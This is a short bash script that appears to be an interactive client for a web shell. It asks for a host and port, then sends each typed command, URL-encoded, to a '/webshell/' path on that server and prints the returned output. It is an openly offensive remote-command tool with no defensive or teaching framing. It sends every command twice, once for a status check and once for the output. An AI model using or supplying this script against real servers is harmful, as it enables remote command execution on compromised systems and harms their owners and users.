#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
  read -rp '$ ' raw_command
  command=$(printf %s "${raw_command}" | jq -sRr @uri)
  response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
  http_code=$(tail -n1 <<< "$response")

  # Check if the HTTP status code is a valid integer
  if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
    if [ "${http_code}" -eq 200 ]; then
      curl "http://${host}:${port}/webshell/${command}"
    else
      echo "Error: HTTP status code ${http_code}"
    fi
  else
    echo "Error: Invalid HTTP status code received"
  fi
done
  
